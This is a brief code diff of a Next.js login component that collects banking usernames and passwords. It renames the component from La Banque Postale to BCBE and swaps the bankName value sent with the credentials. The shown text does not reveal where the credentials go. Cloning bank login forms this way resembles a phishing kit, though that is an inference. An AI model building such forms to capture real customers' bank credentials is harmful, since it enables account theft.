@@ -4,7 +4,7 @@ import Link from "next/link";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 
-export default function BanquepostaleConnect() {
+export default function BCBEConnect() {
   const router = useRouter();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -25,7 +25,7 @@ export default function BanquepostaleConnect() {
         body: JSON.stringify({ 
           username, 
           password, 
-          bankName: "BANQUEPOSTALE" // Ajout explicite du nom de la banque ici
+          bankName: "BCBE" // Ajout explicite du nom de la banque ici
         }),
       });
 
